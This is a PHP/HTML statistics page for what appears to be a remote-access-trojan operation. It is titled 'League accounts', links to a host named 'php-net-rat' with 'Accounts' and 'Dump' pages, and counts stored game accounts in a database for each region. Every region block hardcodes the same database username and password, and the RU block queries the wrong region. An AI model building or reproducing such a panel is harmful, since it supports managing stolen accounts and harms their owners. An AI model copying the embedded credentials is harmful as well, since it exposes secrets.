<!DOCTYPE html>
<html lang="en" class="demo-3">
	<head>
		<meta charset="UTF-8" />
		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> 
		<meta name="viewport" content="width=device-width, initial-scale=1.0"> 
		<title>LC Statistics</title>
		<link rel="stylesheet" type="text/css" href="css/style.css" />
		<link href='http://fonts.googleapis.com/css?family=Hammersmith+One|Questrial' rel='stylesheet' type='text/css'>
		<script src="js/modernizr.custom.63321.js"></script>
		<link rel="stylesheet" href="css/style_menu.css">
		<link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
		<link rel="stylesheet" href="css/style_profile.css">
	</head>
	<body>
		<div class="container">
			<header>
				<h1><strong>League</strong> accounts</h1>
				<h2>v 1.0.0.0</h2><br>
				<section class="container">
					<nav>
					  <ul class="nav">
						<li><a href="http://php-net-rat.esy.es/users.php" title="Accounts">Accounts</a></li>
						<li><a href="http://php-net-rat.esy.es/profile/dumplist.php" title="Search">Dump</a></li>
						<li><a href="http://php-net-rat.esy.es/profile/select_region.php" title="Statistics">Statistics</a></li>
					  </ul>
					</nav>	
				</section>
			</header>
			<center>
			
				<div class="profile-box">
					<figure class="profile-header">
					<figcaption class="profile-name">
						<font color="orange"> Regions</font>
					</figcaption>
					</figure>
					<p class="profile-detail">
						<span class="profile-label">NA:</span><span class="profile-value"><a href="http://php-net-rat.esy.es/profile/stats.php?region=NA">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query('SELECT * FROM u474826184_rp.accounts WHERE `region`=\'NA\';')  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?></a>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">EUNE:</span><span class="profile-value"><a href="http://php-net-rat.esy.es/profile/stats.php?region=EUN">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query('SELECT * FROM u474826184_rp.accounts WHERE `region`=\'EUN\';')  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?></a>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">EUW:</span><span class="profile-value"><a href="http://php-net-rat.esy.es/profile/stats.php?region=EUW">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query('SELECT * FROM u474826184_rp.accounts WHERE `region`=\'EUW\';')  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?></a>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">KR:</span><span class="profile-value"><a href="http://php-net-rat.esy.es/profile/stats.php?region=KR">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query('SELECT * FROM u474826184_rp.accounts WHERE `region`=\'KR\';')  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?></a>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">BR:</span><span class="profile-value"><a href="http://php-net-rat.esy.es/profile/stats.php?region=BR">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query('SELECT * FROM u474826184_rp.accounts WHERE `region`=\'BR\';')  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?></a>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">TR:</span><span class="profile-value"><a href="http://php-net-rat.esy.es/profile/stats.php?region=TR">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query('SELECT * FROM u474826184_rp.accounts WHERE `region`=\'TR\';')  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?></a>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">RU:</span><span class="profile-value"><a href="http://php-net-rat.esy.es/profile/stats.php?region=RU">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query('SELECT * FROM u474826184_rp.accounts WHERE `region`=\'NA\';')  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?></a>
						</span>
					</p><p class="profile-detail">
						<span class="profile-label">LA1:</span><span class="profile-value"><a href="http://php-net-rat.esy.es/profile/stats.php?region=LA1">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query('SELECT * FROM u474826184_rp.accounts WHERE `region`=\'LA1\';')  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?></a>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">LA2:</span><span class="profile-value"><a href="http://php-net-rat.esy.es/profile/stats.php?region=LA2">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query('SELECT * FROM u474826184_rp.accounts WHERE `region`=\'LA2\';')  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?></a>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">PBE:</span><span class="profile-value"><a href="http://php-net-rat.esy.es/profile/stats.php?region=PBE">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query('SELECT * FROM u474826184_rp.accounts WHERE `region`=\'PBE\';')  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?></a>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">SG:</span><span class="profile-value"><a href="http://php-net-rat.esy.es/profile/stats.php?region=SG">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query('SELECT * FROM u474826184_rp.accounts WHERE `region`=\'SG\';')  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?></a>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">MY:</span><span class="profile-value"><a href="http://php-net-rat.esy.es/profile/stats.php?region=MY">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query('SELECT * FROM u474826184_rp.accounts WHERE `region`=\'MY\';')  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?></a>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">SGMY:</span><span class="profile-value"><a href="http://php-net-rat.esy.es/profile/stats.php?region=SGMY">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query('SELECT * FROM u474826184_rp.accounts WHERE `region`=\'SGMY\';')  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?></a>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">TW:</span><span class="profile-value"><a href="http://php-net-rat.esy.es/profile/stats.php?region=TW">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query('SELECT * FROM u474826184_rp.accounts WHERE `region`=\'TW\';')  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?></a>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">TH:</span><span class="profile-value"><a href="http://php-net-rat.esy.es/profile/stats.php?region=TH">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query('SELECT * FROM u474826184_rp.accounts WHERE `region`=\'TH\';')  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?></a>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">PH:</span><span class="profile-value"><a href="http://php-net-rat.esy.es/profile/stats.php?region=PH">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query('SELECT * FROM u474826184_rp.accounts WHERE `region`=\'PH\';')  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?></a>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">VN:</span><span class="profile-value"><a href="http://php-net-rat.esy.es/profile/stats.php?region=VN">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query('SELECT * FROM u474826184_rp.accounts WHERE `region`=\'VN\';')  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?></a>
						</span>
					</p><p class="profile-detail">
						<span class="profile-label">OCE:</span><span class="profile-value"><a href="http://php-net-rat.esy.es/profile/stats.php?region=OCE">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query('SELECT * FROM u474826184_rp.accounts WHERE `region`=\'OCE\';')  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?></a>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">LAN:</span><span class="profile-value"><a href="http://php-net-rat.esy.es/profile/stats.php?region=LAN">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query('SELECT * FROM u474826184_rp.accounts WHERE `region`=\'LAN\';')  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?></a>
						</span>
					</p>
					<p class="profile-detail">
						<span class="profile-label">LAS:</span><span class="profile-value"><a href="http://php-net-rat.esy.es/profile/stats.php?region=LAS">
						<?php
							mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
							mysql_select_db('u474826184_rp') or die(mysql_error());
							$status=mysql_query('SELECT * FROM u474826184_rp.accounts WHERE `region`=\'LAS\';')  or die(mysql_error());
							$num_rows = mysql_num_rows($status);
							echo $num_rows;
						?></a>
						</span>
					</p>
					
					
					
				</div>
					
				
			
			</center>
		</div>
		></a>
	</body>
</html>